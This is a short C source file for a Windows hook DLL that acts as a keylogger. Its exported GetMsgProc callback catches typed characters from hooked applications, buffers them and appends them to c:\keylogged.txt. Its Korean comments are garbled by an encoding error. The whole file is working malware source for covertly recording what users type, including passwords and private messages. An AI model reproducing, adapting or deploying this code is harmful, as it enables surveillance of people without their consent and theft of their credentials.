#include <windows.h>

#define BUF_LEN	80	// �ִ� 80 + ���๮�� 1 + �ι��� 1
#define BS	8		// BackSpace
#define TAB 9		// ĳ����Return
#define LF  10		// LineFeed
#define CR  13		// ĳ����Return

void BufToFile(char *buf);

__declspec(dllexport) LRESULT CALLBACK GetMsgProc(INT nCode, WPARAM wp, LPARAM lp)
{
	static char buf[BUF_LEN];
	char wParam;

    if(((MSG*)lp)->message == (long)WM_CHAR)  
    {                         
		// ���� ó��
		wParam = ((MSG*)lp)->wParam;
		if (wParam == BS) {
			buf[lstrlen(buf)-1] = 0;
		} 
		else if (wParam == TAB) {
			wsprintf(buf+lstrlen(buf), "\t");
		}
		else if (wParam == LF) {
			wsprintf(buf+lstrlen(buf), "\r\n");
		}
		else if (wParam == CR) {
			wsprintf(buf+lstrlen(buf), "\r\n");
		}
		else {
			wsprintf(buf+lstrlen(buf), "%c", wParam);
		}

		// ���� ũ�� ���� �� ���Ϸ� ����
		if (lstrlen(buf) >= (BUF_LEN - 3) ) {
			wsprintf(buf+lstrlen(buf), "\r\n");
			//wsprintf(buf, "�ѱ��� ����� ���δ�.\r\n");
			BufToFile(buf); 
			buf[0] = 0; // ���� �ʱ�ȭ
		}
    }
    return TRUE;  
}

void BufToFile(char *buf) 
{
	HANDLE hFile;
	DWORD dwWrite;

	// 1. open file
	hFile = CreateFile("c:\\keylogged.txt", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);        
	
	// 2. move fp to end
	SetFilePointer(hFile, 0, 0, FILE_END);
	
	// 3. write to file
	WriteFile(hFile, buf, lstrlen(buf), &dwWrite, NULL); 
	
	// 4. close file
	CloseHandle(hFile);  
}
